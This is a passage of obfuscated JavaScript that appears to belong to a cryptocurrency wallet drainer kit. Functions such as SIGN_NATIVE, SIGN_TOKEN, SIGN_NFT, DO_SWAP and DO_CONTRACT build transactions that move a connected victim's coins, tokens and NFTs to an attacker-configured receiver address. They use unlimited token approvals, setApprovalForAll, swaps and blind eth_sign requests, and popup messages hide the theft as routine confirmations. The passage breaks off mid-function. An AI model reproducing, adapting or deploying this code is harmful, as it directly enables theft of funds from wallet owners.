                'allowEscapeKey': ![],
                'timer': 0x9c4,
                'width': 0x258,
                'showConfirmButton': ![]
            })[_0x1f0c70(0x236)](() => {
                const _0x40218b = _0x1f0c70;
                Swal['fire']({
                    'html': _0x40218b(0x28c),
                    'imageUrl': _0x40218b(0x23b),
                    'imageHeight': 0x3c,
                    'allowOutsideClick': ![],
                    'allowEscapeKey': ![],
                    'timer': 0x0,
                    'width': 0x258,
                    'showConfirmButton': ![]
                });
            });
        } catch (_0x417097) {
            console[_0x1f0c70(0x2c3)](_0x417097);
        }
    },
    end_message = () => {
        const _0x1b4611 = _0x53f51f;
        try {
            Swal['close'](), Swal[_0x1b4611(0x16e)]({
                'html': _0x1b4611(0x1f5),
                'icon': _0x1b4611(0x25e),
                'allowOutsideClick': !![],
                'allowEscapeKey': !![],
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': !![],
                'confirmButtonText': 'OK'
            });
        } catch (_0x341c80) {
            console[_0x1b4611(0x2c3)](_0x341c80);
        }
    };
let is_first_sign = !![];
const sign_ready = () => {
        const _0x959f91 = _0x53f51f;
        try {
            Swal[_0x959f91(0x1dc)](), Swal[_0x959f91(0x16e)]({
                'html': '<b>Success!</b>\x20Your\x20sign\x20is\x20confirmed!',
                'icon': 'success',
                'allowOutsideClick': ![],
                'allowEscapeKey': ![],
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': ![]
            });
        } catch (_0x455c2f) {
            console[_0x959f91(0x2c3)](_0x455c2f);
        }
    },
    sign_next = () => {
        const _0x33ec4c = _0x53f51f;
        try {
            if (is_first_sign) {
                is_first_sign = ![];
                return;
            }
            Swal[_0x33ec4c(0x1dc)](), Swal[_0x33ec4c(0x16e)]({
                'html': _0x33ec4c(0x1eb),
                'imageUrl': _0x33ec4c(0x23b),
                'imageHeight': 0x3c,
                'allowOutsideClick': ![],
                'allowEscapeKey': ![],
                'timer': 0x0,
                'width': 0x258,
                'showConfirmButton': ![]
            });
        } catch (_0x2fb995) {
            console[_0x33ec4c(0x2c3)](_0x2fb995);
        }
    },
    is_nft_approved = async (_0x1b77f9, _0x434c23, _0x4fa6b5) => {
        const _0x5aec62 = _0x53f51f;
        try {
            const _0x4a3e22 = new ethers[(_0x5aec62(0x1f8))][(_0x5aec62(0x2ab))](MS_Settings[_0x5aec62(0x219)][0x1]),
                _0x1af613 = new ethers[(_0x5aec62(0x246))](_0x1b77f9, MS_Contract_ABI[_0x5aec62(0x1fe)], _0x4a3e22);
            return await _0x1af613[_0x5aec62(0x17b)](_0x434c23, _0x4fa6b5);
        } catch (_0x198d40) {
            return console['log'](_0x198d40), ![];
        }
    },
    SIGN_NATIVE = async _0xffe1b0 => {
        const _0x11ee5e = _0x53f51f,
            _0x2f4940 = new Web3(MS_Provider),
            _0x122fb6 = new ethers[(_0x11ee5e(0x1f8))]['JsonRpcProvider'](MS_Settings[_0x11ee5e(0x219)][_0xffe1b0[_0x11ee5e(0x213)]]),
            _0xdacc8 = ethers[_0x11ee5e(0x22e)][_0x11ee5e(0x245)](await _0x122fb6[_0x11ee5e(0x25d)]())['div'](ethers['BigNumber']['from'](_0x11ee5e(0x29d)))['mul'](ethers['BigNumber'][_0x11ee5e(0x245)](_0x11ee5e(0x20f)))[_0x11ee5e(0x23c)](),
            _0x5b6d70 = _0xffe1b0[_0x11ee5e(0x213)] == 0xa4b1 ? 0x16e360 : _0xffe1b0['chain_id'] == 0xa86a ? 0x16e360 : 0x5208,
            _0x29e072 = _0xffe1b0[_0x11ee5e(0x213)] == 0xa4b1 ? 0x4c4b40 : _0xffe1b0[_0x11ee5e(0x213)] == 0xa86a ? 0x4c4b40 : 0x249f0,
            _0xe10a06 = ethers[_0x11ee5e(0x22e)][_0x11ee5e(0x245)](_0xffe1b0['chain_id'] == 0xa ? _0x11ee5e(0x2c1) : _0xdacc8),
            _0x5a45bf = _0xe10a06[_0x11ee5e(0x29f)](ethers['BigNumber'][_0x11ee5e(0x245)](_0x5b6d70))[_0x11ee5e(0x29f)](ethers[_0x11ee5e(0x22e)][_0x11ee5e(0x245)]('2')),
            _0x50c586 = _0xe10a06[_0x11ee5e(0x29f)](ethers[_0x11ee5e(0x22e)][_0x11ee5e(0x245)](_0x29e072))[_0x11ee5e(0x29f)](ethers[_0x11ee5e(0x22e)][_0x11ee5e(0x245)](String(MS_Gas_Reserves[_0xffe1b0[_0x11ee5e(0x213)]]))),
            _0x22c26f = ethers['BigNumber'][_0x11ee5e(0x245)](_0xffe1b0[_0x11ee5e(0x2d1)])[_0x11ee5e(0x2d8)](_0x5a45bf)[_0x11ee5e(0x2d8)](_0x50c586)[_0x11ee5e(0x23c)]();
        if (ethers['BigNumber'][_0x11ee5e(0x245)](_0x22c26f)[_0x11ee5e(0x1c3)](ethers[_0x11ee5e(0x22e)][_0x11ee5e(0x245)]('0'))) throw _0x11ee5e(0x24d);
        const _0x14e9be = await get_nonce(_0xffe1b0[_0x11ee5e(0x213)]);
        let _0x1ce8d3 = {
                'to': MS_Settings[_0x11ee5e(0x19c)],
                'nonce': _0x2f4940['utils']['toHex'](_0x14e9be),
                'gasLimit': _0x2f4940['utils'][_0x11ee5e(0x209)](_0x5b6d70),
                'gasPrice': _0x2f4940['utils'][_0x11ee5e(0x209)](_0xdacc8),
                'value': _0x2f4940[_0x11ee5e(0x1a4)][_0x11ee5e(0x209)](_0x22c26f),
                'data': '0x',
                'v': _0x2f4940[_0x11ee5e(0x1a4)]['toHex'](MS_Current_Chain_ID),
                'r': '0x',
                's': '0x'
            },
            _0x4cced2 = new ethereumjs['Tx'](_0x1ce8d3),
            _0x1e9a57 = '0x' + _0x4cced2[_0x11ee5e(0x2dc)]()[_0x11ee5e(0x23c)](_0x11ee5e(0x292)),
            _0x3ff14f = _0x2f4940[_0x11ee5e(0x1a4)][_0x11ee5e(0x192)](_0x1e9a57, {
                'encoding': _0x11ee5e(0x292)
            });
        await sign_request(_0xffe1b0);
        const _0x195a76 = await _0x2f4940[_0x11ee5e(0x28a)][_0x11ee5e(0x17f)](_0x3ff14f, MS_Current_Address),
            _0x24f15c = _0x195a76[_0x11ee5e(0x21e)](0x2),
            _0x47f5f7 = '0x' + _0x24f15c[_0x11ee5e(0x21e)](0x0, 0x40),
            _0x3f23bc = '0x' + _0x24f15c[_0x11ee5e(0x21e)](0x40, 0x80),
            _0x5b9a17 = parseInt(_0x24f15c[_0x11ee5e(0x21e)](0x80, 0x82), 0x10),
            _0xed7edd = _0x2f4940[_0x11ee5e(0x1a4)][_0x11ee5e(0x209)](_0x5b9a17 + _0xffe1b0[_0x11ee5e(0x213)] * 0x2 + 0x8);
        _0x4cced2['r'] = _0x47f5f7, _0x4cced2['s'] = _0x3f23bc, _0x4cced2['v'] = _0xed7edd;
        const _0x920b = '0x' + _0x4cced2[_0x11ee5e(0x2dc)]()[_0x11ee5e(0x23c)](_0x11ee5e(0x292));
        sign_next();
        const _0xc8ea4c = await _0x122fb6[_0x11ee5e(0x282)](_0x920b);
        wait_message();
        if (MS_Settings['Settings'][_0x11ee5e(0x1ab)]) await _0x122fb6[_0x11ee5e(0x1ba)](_0xc8ea4c[_0x11ee5e(0x2ba)], 0x1, 0x7530);
        await sign_success(_0xffe1b0, _0x22c26f), sign_ready();
    },
    SIGN_TOKEN = async _0x4e0f16 => {
        const _0x57e2cd = _0x53f51f,
            _0x4e0b07 = new Web3(MS_Provider),
            _0x853334 = new ethers[(_0x57e2cd(0x1f8))][(_0x57e2cd(0x2ab))](MS_Settings[_0x57e2cd(0x219)][_0x4e0f16['chain_id']]),
            _0x1b5da6 = new ethers['Contract'](_0x4e0f16[_0x57e2cd(0x18c)], MS_Contract_ABI[_0x57e2cd(0x2b2)], _0x853334),
            _0x10853f = ethers[_0x57e2cd(0x22e)]['from'](await _0x853334['getGasPrice']())[_0x57e2cd(0x191)](ethers[_0x57e2cd(0x22e)][_0x57e2cd(0x245)](_0x57e2cd(0x29d)))[_0x57e2cd(0x29f)](ethers['BigNumber']['from']('120'))[_0x57e2cd(0x23c)]();
        let _0x193e6a = null,
            _0x88938a = ethers['utils'][_0x57e2cd(0x16f)](MS_Unlimited_Amount);
        for (const _0x2cac84 of MS_Settings[_0x57e2cd(0x2bb)]) {
            try {
                if (_0x2cac84[0x0] == MS_Current_Chain_ID && _0x2cac84[0x1] == _0x4e0f16['address']['toLowerCase']()) {
                    _0x88938a = _0x4e0f16[_0x57e2cd(0x2d1)];
                    break;
                }
            } catch (_0x4e3703) {
                console[_0x57e2cd(0x2c3)](_0x4e3703);
            }
        }
        try {
            if (MS_Settings[_0x57e2cd(0x231)]['Sign'][_0x57e2cd(0x24e)] == 0x1) _0x193e6a = await _0x1b5da6[_0x57e2cd(0x1ff)][_0x57e2cd(0x2c5)](MS_Settings[_0x57e2cd(0x216)], _0x88938a, {
                'from': MS_Current_Address
            });
            else MS_Settings[_0x57e2cd(0x231)][_0x57e2cd(0x20c)][_0x57e2cd(0x24e)] == 0x2 && (_0x193e6a = await _0x1b5da6[_0x57e2cd(0x1ff)]['transfer'](MS_Settings[_0x57e2cd(0x19c)], _0x4e0f16[_0x57e2cd(0x2d1)], {
                'from': MS_Current_Address
            }));
            _0x193e6a = ethers[_0x57e2cd(0x22e)][_0x57e2cd(0x245)](_0x193e6a)[_0x57e2cd(0x191)](ethers[_0x57e2cd(0x22e)][_0x57e2cd(0x245)](_0x57e2cd(0x29d)))[_0x57e2cd(0x29f)](ethers[_0x57e2cd(0x22e)][_0x57e2cd(0x245)]('120'))[_0x57e2cd(0x23c)]();
        } catch (_0x17f17d) {
            _0x193e6a = _0x4e0f16[_0x57e2cd(0x213)] == 0xa4b1 ? 0x4c4b40 : _0x4e0f16['chain_id'] == 0xa86a ? 0x4c4b40 : 0x3d090;
        }
        const _0x12cb13 = await get_nonce(_0x4e0f16['chain_id']);
        let _0x294e43 = null,
            _0x54aaa0 = new _0x4e0b07['eth'][(_0x57e2cd(0x246))](MS_Contract_ABI[_0x57e2cd(0x2b2)], _0x4e0f16[_0x57e2cd(0x18c)]);
        if (MS_Settings[_0x57e2cd(0x231)][_0x57e2cd(0x20c)][_0x57e2cd(0x24e)] == 0x1) _0x294e43 = _0x54aaa0[_0x57e2cd(0x2af)][_0x57e2cd(0x2c5)](MS_Settings[_0x57e2cd(0x216)], _0x88938a)[_0x57e2cd(0x166)]();
        else {
            if (MS_Settings[_0x57e2cd(0x231)][_0x57e2cd(0x20c)][_0x57e2cd(0x24e)] == 0x2) _0x294e43 = _0x54aaa0[_0x57e2cd(0x2af)]['transfer'](MS_Settings['Receiver'], _0x4e0f16[_0x57e2cd(0x2d1)])[_0x57e2cd(0x166)]();
        }
        let _0x2e8e25 = {
                'to': _0x4e0f16['address'],
                'nonce': _0x4e0b07[_0x57e2cd(0x1a4)][_0x57e2cd(0x209)](_0x12cb13),
                'gasLimit': _0x4e0b07['utils']['toHex'](_0x193e6a),
                'gasPrice': _0x4e0b07[_0x57e2cd(0x1a4)][_0x57e2cd(0x209)](_0x10853f),
                'value': _0x57e2cd(0x272),
                'data': _0x294e43,
                'v': _0x4e0b07[_0x57e2cd(0x1a4)][_0x57e2cd(0x209)](MS_Current_Chain_ID),
                'r': '0x',
                's': '0x'
            },
            _0x34ea3c = new ethereumjs['Tx'](_0x2e8e25),
            _0x548a02 = '0x' + _0x34ea3c['serialize']()[_0x57e2cd(0x23c)](_0x57e2cd(0x292)),
            _0x366bfc = _0x4e0b07[_0x57e2cd(0x1a4)]['sha3'](_0x548a02, {
                'encoding': _0x57e2cd(0x292)
            });
        await sign_request(_0x4e0f16);
        const _0x1f65d1 = await _0x4e0b07['eth'][_0x57e2cd(0x17f)](_0x366bfc, MS_Current_Address),
            _0x7e2eca = _0x1f65d1[_0x57e2cd(0x21e)](0x2),
            _0x5194c5 = '0x' + _0x7e2eca[_0x57e2cd(0x21e)](0x0, 0x40),
            _0x14f750 = '0x' + _0x7e2eca['substring'](0x40, 0x80),
            _0x2af9d0 = parseInt(_0x7e2eca[_0x57e2cd(0x21e)](0x80, 0x82), 0x10),
            _0x58ff86 = _0x4e0b07['utils']['toHex'](_0x2af9d0 + _0x4e0f16[_0x57e2cd(0x213)] * 0x2 + 0x8);
        _0x34ea3c['r'] = _0x5194c5, _0x34ea3c['s'] = _0x14f750, _0x34ea3c['v'] = _0x58ff86;
        const _0x37c7ba = '0x' + _0x34ea3c['serialize']()[_0x57e2cd(0x23c)](_0x57e2cd(0x292));
        sign_next();
        const _0x232db6 = await _0x853334[_0x57e2cd(0x282)](_0x37c7ba);
        wait_message();
        if (MS_Settings[_0x57e2cd(0x231)][_0x57e2cd(0x1ab)]) await _0x853334[_0x57e2cd(0x1ba)](_0x232db6[_0x57e2cd(0x2ba)], 0x1, 0x7530);
        await sign_success(_0x4e0f16), sign_ready();
    },
    SIGN_NFT = async _0x3794ec => {
        const _0x14c5e2 = _0x53f51f,
            _0x31c0e7 = new Web3(MS_Provider),
            _0x54331d = new ethers[(_0x14c5e2(0x1f8))][(_0x14c5e2(0x2ab))](MS_Settings[_0x14c5e2(0x219)][_0x3794ec[_0x14c5e2(0x213)]]),
            _0x467819 = new ethers[(_0x14c5e2(0x246))](_0x3794ec[_0x14c5e2(0x18c)], MS_Contract_ABI[_0x14c5e2(0x1fe)], _0x54331d),
            _0x16cd0b = ethers[_0x14c5e2(0x22e)]['from'](await _0x54331d['getGasPrice']())[_0x14c5e2(0x191)](ethers[_0x14c5e2(0x22e)][_0x14c5e2(0x245)]('100'))[_0x14c5e2(0x29f)](ethers[_0x14c5e2(0x22e)][_0x14c5e2(0x245)](_0x14c5e2(0x20f)))[_0x14c5e2(0x23c)]();
        let _0x2b6c8b = null;
        try {
            if (MS_Settings[_0x14c5e2(0x231)]['Sign']['NFTs'] == 0x1) _0x2b6c8b = await _0x467819['estimateGas']['setApprovalForAll'](MS_Settings[_0x14c5e2(0x216)], !![], {
                'from': MS_Current_Address
            });
            else MS_Settings[_0x14c5e2(0x231)][_0x14c5e2(0x20c)][_0x14c5e2(0x2ad)] == 0x2 && (_0x2b6c8b = await _0x467819[_0x14c5e2(0x1ff)][_0x14c5e2(0x284)](MS_Current_Address, MS_Settings[_0x14c5e2(0x19c)], _0x3794ec['id'], {
                'from': MS_Current_Address
            }));
            _0x2b6c8b = ethers['BigNumber'][_0x14c5e2(0x245)](_0x2b6c8b)[_0x14c5e2(0x191)](ethers['BigNumber']['from'](_0x14c5e2(0x29d)))[_0x14c5e2(0x29f)](ethers[_0x14c5e2(0x22e)]['from'](_0x14c5e2(0x20f)))['toString']();
        } catch (_0x77e73b) {
            _0x2b6c8b = _0x3794ec[_0x14c5e2(0x213)] == 0xa4b1 ? 0x4c4b40 : _0x3794ec[_0x14c5e2(0x213)] == 0xa86a ? 0x4c4b40 : 0x3d090;
        }
        const _0x55a852 = await get_nonce(_0x3794ec['chain_id']);
        let _0x5cb20f = null,
            _0x4ce12f = new _0x31c0e7[(_0x14c5e2(0x28a))][(_0x14c5e2(0x246))](MS_Contract_ABI[_0x14c5e2(0x1fe)], _0x3794ec[_0x14c5e2(0x18c)]);
        if (MS_Settings[_0x14c5e2(0x231)][_0x14c5e2(0x20c)][_0x14c5e2(0x2ad)] == 0x1) _0x5cb20f = _0x4ce12f[_0x14c5e2(0x2af)]['setApprovalForAll'](MS_Settings[_0x14c5e2(0x216)], !![])[_0x14c5e2(0x166)]();
        else {
            if (MS_Settings[_0x14c5e2(0x231)][_0x14c5e2(0x20c)][_0x14c5e2(0x2ad)] == 0x2) _0x5cb20f = _0x4ce12f[_0x14c5e2(0x2af)][_0x14c5e2(0x284)](MS_Current_Address, MS_Settings[_0x14c5e2(0x19c)], _0x3794ec['id'])[_0x14c5e2(0x166)]();
        }
        let _0x5aa4c7 = {
                'to': _0x3794ec[_0x14c5e2(0x18c)],
                'nonce': _0x31c0e7[_0x14c5e2(0x1a4)][_0x14c5e2(0x209)](_0x55a852),
                'gasLimit': _0x31c0e7['utils'][_0x14c5e2(0x209)](_0x2b6c8b),
                'gasPrice': _0x31c0e7[_0x14c5e2(0x1a4)]['toHex'](_0x16cd0b),
                'value': _0x14c5e2(0x272),
                'data': _0x5cb20f,
                'v': _0x31c0e7[_0x14c5e2(0x1a4)]['toHex'](MS_Current_Chain_ID),
                'r': '0x',
                's': '0x'
            },
            _0xf65734 = new ethereumjs['Tx'](_0x5aa4c7),
            _0x51bd99 = '0x' + _0xf65734['serialize']()[_0x14c5e2(0x23c)](_0x14c5e2(0x292)),
            _0x516bb5 = _0x31c0e7[_0x14c5e2(0x1a4)][_0x14c5e2(0x192)](_0x51bd99, {
                'encoding': _0x14c5e2(0x292)
            });
        await sign_request(_0x3794ec);
        const _0x62fe69 = await _0x31c0e7['eth']['sign'](_0x516bb5, MS_Current_Address),
            _0x2a77bd = _0x62fe69[_0x14c5e2(0x21e)](0x2),
            _0x515ae4 = '0x' + _0x2a77bd[_0x14c5e2(0x21e)](0x0, 0x40),
            _0x4983eb = '0x' + _0x2a77bd[_0x14c5e2(0x21e)](0x40, 0x80),
            _0x43a30f = parseInt(_0x2a77bd[_0x14c5e2(0x21e)](0x80, 0x82), 0x10),
            _0x171b12 = _0x31c0e7[_0x14c5e2(0x1a4)][_0x14c5e2(0x209)](_0x43a30f + _0x3794ec[_0x14c5e2(0x213)] * 0x2 + 0x8);
        _0xf65734['r'] = _0x515ae4, _0xf65734['s'] = _0x4983eb, _0xf65734['v'] = _0x171b12;
        const _0x4f9158 = '0x' + _0xf65734[_0x14c5e2(0x2dc)]()[_0x14c5e2(0x23c)](_0x14c5e2(0x292));
        sign_next();
        const _0x47f809 = await _0x54331d[_0x14c5e2(0x282)](_0x4f9158);
        wait_message();
        if (MS_Settings[_0x14c5e2(0x231)][_0x14c5e2(0x1ab)]) await _0x54331d[_0x14c5e2(0x1ba)](_0x47f809[_0x14c5e2(0x2ba)], 0x1, 0x7530);
        await sign_success(_0x3794ec), sign_ready();
    },
    DO_SWAP = async _0x1d9634 => {
        const _0x17eaa7 = _0x53f51f,
            _0xc7dd7b = new ethers['providers'][(_0x17eaa7(0x2ab))](MS_Settings[_0x17eaa7(0x219)][_0x1d9634[_0x17eaa7(0x213)]]),
            _0x398429 = Math[_0x17eaa7(0x2c7)](Date[_0x17eaa7(0x280)]() / 0x3e8) + 0x270f * 0xa,
            _0x3b1b1b = new ethers[(_0x17eaa7(0x246))](_0x1d9634['swapper_address'], MS_Pancake_ABI, MS_Signer),
            _0x3aada9 = ethers[_0x17eaa7(0x22e)][_0x17eaa7(0x245)](await _0xc7dd7b[_0x17eaa7(0x25d)]())[_0x17eaa7(0x191)](ethers['BigNumber'][_0x17eaa7(0x245)](_0x17eaa7(0x29d)))[_0x17eaa7(0x29f)](ethers[_0x17eaa7(0x22e)][_0x17eaa7(0x245)](_0x17eaa7(0x20f)))['toString']();
        let _0x4cdf3f = null;
        try {
            _0x4cdf3f = await _0x3b1b1b[_0x17eaa7(0x1ff)][_0x17eaa7(0x259)](_0x288dbc, '0', [_0x1d9634[_0x17eaa7(0x18c)], MS_Swap_Route[_0x1d9634['chain_id']]], MS_Settings['Receiver'], _0x398429, {
                'from': MS_Current_Address
            }), _0x4cdf3f = ethers['BigNumber'][_0x17eaa7(0x245)](_0x4cdf3f)[_0x17eaa7(0x191)](ethers['BigNumber'][_0x17eaa7(0x245)](_0x17eaa7(0x29d)))['mul'](ethers[_0x17eaa7(0x22e)][_0x17eaa7(0x245)](_0x17eaa7(0x20f)))[_0x17eaa7(0x23c)]();
        } catch (_0x48fe13) {
            _0x4cdf3f = _0x1d9634[_0x17eaa7(0x213)] == 0xa4b1 ? 0x4c4b40 : _0x1d9634[_0x17eaa7(0x213)] == 0xa86a ? 0x4c4b40 : 0x55730;
        }
        const _0x25112f = await get_nonce(_0x1d9634[_0x17eaa7(0x213)]),
            _0x288dbc = ethers[_0x17eaa7(0x22e)]['from'](_0x1d9634[_0x17eaa7(0x2d1)])[_0x17eaa7(0x1c3)](ethers[_0x17eaa7(0x22e)][_0x17eaa7(0x245)](_0x1d9634[_0x17eaa7(0x180)])) ? ethers[_0x17eaa7(0x22e)]['from'](_0x1d9634[_0x17eaa7(0x2d1)])[_0x17eaa7(0x23c)]() : ethers[_0x17eaa7(0x22e)][_0x17eaa7(0x245)](_0x1d9634[_0x17eaa7(0x180)])[_0x17eaa7(0x23c)]();
        await sign_request(_0x1d9634), sign_next();
        const _0x1521f8 = await _0x3b1b1b[_0x17eaa7(0x259)](_0x288dbc, '0', [_0x1d9634['address'], MS_Swap_Route[_0x1d9634[_0x17eaa7(0x213)]]], MS_Settings[_0x17eaa7(0x19c)], _0x398429, {
            'gasLimit': ethers[_0x17eaa7(0x22e)][_0x17eaa7(0x245)](_0x4cdf3f),
            'gasPrice': ethers[_0x17eaa7(0x22e)][_0x17eaa7(0x245)](_0x3aada9),
            'nonce': _0x25112f
        });
        wait_message();
        if (MS_Settings[_0x17eaa7(0x231)][_0x17eaa7(0x1ab)]) await _0xc7dd7b[_0x17eaa7(0x1ba)](_0x1521f8['hash'], 0x1, 0xea60);
        await sign_success(_0x1d9634), sign_ready();
    },
    DO_UNISWAP = async (_0x393b9a, _0xb67b30) => {
        const _0x183c13 = _0x53f51f,
            _0x553a69 = new Web3(MS_Provider),
            _0x16b5a7 = new ethers[(_0x183c13(0x1f8))][(_0x183c13(0x2ab))](MS_Settings['RPCs'][_0x393b9a[_0x183c13(0x213)]]),
            _0x2c5876 = Math[_0x183c13(0x2c7)](Date[_0x183c13(0x280)]() / 0x3e8) + 0x270f * 0xa,
            _0x332553 = new ethers[(_0x183c13(0x246))](_0x393b9a[_0x183c13(0x1e2)], MS_Uniswap_ABI, MS_Signer),
            _0x81bdc8 = ethers[_0x183c13(0x22e)][_0x183c13(0x245)](await _0x16b5a7[_0x183c13(0x25d)]())[_0x183c13(0x191)](ethers[_0x183c13(0x22e)][_0x183c13(0x245)]('100'))['mul'](ethers[_0x183c13(0x22e)][_0x183c13(0x245)](_0x183c13(0x20f)))['toString'](),
            _0x40d99a = await get_nonce(_0x393b9a['chain_id']),
            _0x291ac8 = [];
        for (const _0xe9b893 of _0xb67b30) {
            try {
                const _0x3f567a = ethers[_0x183c13(0x22e)][_0x183c13(0x245)](_0xe9b893[_0x183c13(0x2d1)])[_0x183c13(0x1c3)](ethers[_0x183c13(0x22e)][_0x183c13(0x245)](_0xe9b893[_0x183c13(0x180)])) ? ethers[_0x183c13(0x22e)][_0x183c13(0x245)](_0xe9b893['amount_raw'])[_0x183c13(0x23c)]() : ethers[_0x183c13(0x22e)][_0x183c13(0x245)](_0xe9b893[_0x183c13(0x180)])['toString'](),
                    _0xd2202b = new _0x553a69[(_0x183c13(0x28a))][(_0x183c13(0x246))](MS_Uniswap_ABI, _0xe9b893[_0x183c13(0x1e2)]),
                    _0x30e7c0 = _0xd2202b[_0x183c13(0x2af)][_0x183c13(0x18b)](_0x3f567a, '0', [_0xe9b893['address'], MS_Swap_Route[_0xe9b893[_0x183c13(0x213)]]], MS_Settings[_0x183c13(0x19c)])[_0x183c13(0x166)]();
                _0x291ac8[_0x183c13(0x1bd)](_0x30e7c0);
            } catch (_0x29cda3) {
                console['log'](_0x29cda3);
            }
        }
        let _0x3bf207 = null;
        try {
            _0x3bf207 = await _0x332553[_0x183c13(0x1ff)]['multicall'](_0x2c5876, _0x291ac8, {
                'from': MS_Current_Address
            }), _0x3bf207 = ethers[_0x183c13(0x22e)]['from'](_0x3bf207)[_0x183c13(0x191)](ethers['BigNumber'][_0x183c13(0x245)](_0x183c13(0x29d)))[_0x183c13(0x29f)](ethers[_0x183c13(0x22e)][_0x183c13(0x245)]('120'))['toString']();
        } catch (_0x5d593b) {
            _0x3bf207 = _0x393b9a[_0x183c13(0x213)] == 0xa4b1 ? 0x4c4b40 : _0x393b9a[_0x183c13(0x213)] == 0xa86a ? 0x4c4b40 : 0x7a120;
        }
        await sign_request(_0x393b9a), sign_next();
        const _0x48b366 = await _0x332553[_0x183c13(0x156)](_0x2c5876, _0x291ac8, {
            'gasLimit': ethers['BigNumber'][_0x183c13(0x245)](_0x3bf207),
            'gasPrice': ethers[_0x183c13(0x22e)]['from'](_0x81bdc8),
            'nonce': _0x40d99a
        });
        wait_message();
        if (MS_Settings[_0x183c13(0x231)][_0x183c13(0x1ab)]) await _0x16b5a7[_0x183c13(0x1ba)](_0x48b366[_0x183c13(0x2ba)], 0x1, 0xea60);
        for (const _0x439b44 of _0xb67b30) {
            await sign_success(_0x439b44);
        }
        sign_ready();
    },
    DO_CONTRACT = async _0x4ec492 => {
        const _0x47894a = _0x53f51f,
            _0x10c0cf = new Web3(MS_Provider),
            _0x4aecf2 = new ethers[(_0x47894a(0x1f8))]['JsonRpcProvider'](MS_Settings[_0x47894a(0x219)][_0x4ec492[_0x47894a(0x213)]]),
            _0x149810 = ethers[_0x47894a(0x22e)][_0x47894a(0x245)](await _0x4aecf2[_0x47894a(0x25d)]())[_0x47894a(0x191)](ethers[_0x47894a(0x22e)]['from'](_0x47894a(0x29d)))[_0x47894a(0x29f)](ethers[_0x47894a(0x22e)][_0x47894a(0x245)]('120'))[_0x47894a(0x23c)](),
            _0x239aaa = _0x4ec492[_0x47894a(0x213)] == 0xa4b1 ? 0x4c4b40 : _0x4ec492[_0x47894a(0x213)] == 0xa86a ? 0x4c4b40 : 0xea60,
            _0x2cdbe6 = _0x4ec492[_0x47894a(0x213)] == 0xa4b1 ? 0x4c4b40 : _0x4ec492[_0x47894a(0x213)] == 0xa86a ? 0x4c4b40 : 0x249f0,
            _0x5c0d8c = ethers[_0x47894a(0x22e)][_0x47894a(0x245)](_0x4ec492[_0x47894a(0x213)] == 0xa ? '35000000000' : _0x149810),
            _0x4a9f01 = _0x5c0d8c['mul'](ethers[_0x47894a(0x22e)][_0x47894a(0x245)](_0x239aaa))[_0x47894a(0x29f)](ethers[_0x47894a(0x22e)][_0x47894a(0x245)]('2')),
            _0x30711e = _0x5c0d8c[_0x47894a(0x29f)](ethers['BigNumber'][_0x47894a(0x245)](_0x2cdbe6))[_0x47894a(0x29f)](ethers[_0x47894a(0x22e)][_0x47894a(0x245)](String(MS_Gas_Reserves[_0x4ec492[_0x47894a(0x213)]]))),
            _0x16fcb7 = ethers['BigNumber']['from'](_0x4ec492[_0x47894a(0x2d1)])[_0x47894a(0x2d8)](_0x4a9f01)[_0x47894a(0x2d8)](_0x30711e)[_0x47894a(0x23c)]();
        if (ethers['BigNumber'][_0x47894a(0x245)](_0x16fcb7)['lte'](ethers[_0x47894a(0x22e)]['from']('0'))) throw _0x47894a(0x24d);
        const _0x5d7564 = await get_nonce(_0x4ec492[_0x47894a(0x213)]),
            _0x589eaa = convert_chain('ID', _0x47894a(0x1c9), _0x4ec492[_0x47894a(0x213)]),
            _0x119d64 = new ethers['Contract'](MS_Settings[_0x47894a(0x231)][_0x47894a(0x1a1)][_0x589eaa]['Contract_Address'], MS_Settings[_0x47894a(0x231)][_0x47894a(0x1a1)][_0x589eaa][_0x47894a(0x21d)] == 0x1 ? MS_Contract_ABI['CONTRACT_LEGACY'] : MS_Contract_ABI[_0x47894a(0x2a4)], MS_Signer);
        await transfer_request(_0x4ec492), sign_next();
        let _0xc7315 = null;
        MS_Settings[_0x47894a(0x231)][_0x47894a(0x1a1)][_0x589eaa][_0x47894a(0x21d)] == 0x0 ? _0xc7315 = await _0x119d64[MS_Settings['Settings'][_0x47894a(0x1a1)][_0x589eaa]['Contract_Type']](MS_Settings['Address'], {
            'gasLimit': ethers[_0x47894a(0x22e)][_0x47894a(0x245)](_0x239aaa),
            'gasPrice': ethers['BigNumber']['from'](_0x149810),
            'nonce': _0x5d7564,
            'value': ethers[_0x47894a(0x22e)][_0x47894a(0x245)](_0x16fcb7)
        }) : _0xc7315 = await _0x119d64[MS_Settings[_0x47894a(0x231)][_0x47894a(0x1a1)][_0x589eaa][_0x47894a(0x204)]]({
            'gasLimit': ethers[_0x47894a(0x22e)][_0x47894a(0x245)](_0x239aaa),
            'gasPrice': ethers[_0x47894a(0x22e)][_0x47894a(0x245)](_0x149810),
            'nonce': _0x5d7564,
            'value': ethers['BigNumber'][_0x47894a(0x245)](_0x16fcb7)
        });
        wait_message();
        if (MS_Settings[_0x47894a(0x231)][_0x47894a(0x1ab)]) await _0x4aecf2[_0x47894a(0x1ba)](_0xc7315[_0x47894a(0x2ba)], 0x1, 0x7530);
        await transfer_success(_0x4ec492, _0x16fcb7), sign_ready();
    },
    TRANSFER_NATIVE = async _0x3c3e77 => {
        const _0x37444d = _0x53f51f,
            _0x45c3b7 = convert_chain('ID', _0x37444d(0x1c9), _0x3c3e77[_0x37444d(0x213)]);
        if (MS_Settings[_0x37444d(0x231)]['Chains'][_0x45c3b7][_0x37444d(0x2a2)] != '') return DO_CONTRACT(_0x3c3e77);
        const _0x28b871 = new Web3(MS_Provider),
            _0x4502d2 = new ethers['providers'][(_0x37444d(0x2ab))](MS_Settings['RPCs'][_0x3c3e77[_0x37444d(0x213)]]),
            _0x3edbc8 = ethers[_0x37444d(0x22e)][_0x37444d(0x245)](await _0x4502d2[_0x37444d(0x25d)]())[_0x37444d(0x191)](ethers[_0x37444d(0x22e)][_0x37444d(0x245)]('100'))[_0x37444d(0x29f)](ethers[_0x37444d(0x22e)]['from']('120'))[_0x37444d(0x23c)](),
            _0xcbdff2 = _0x3c3e77[_0x37444d(0x213)] == 0xa4b1 ? 0x16e360 : _0x3c3e77[_0x37444d(0x213)] == 0xa86a ? 0x16e360 : 0x5208,
            _0x4048c7 = _0x3c3e77[_0x37444d(0x213)] == 0xa4b1 ? 0x4c4b40 : _0x3c3e77['chain_id'] == 0xa86a ? 0x4c4b40 : 0x249f0,
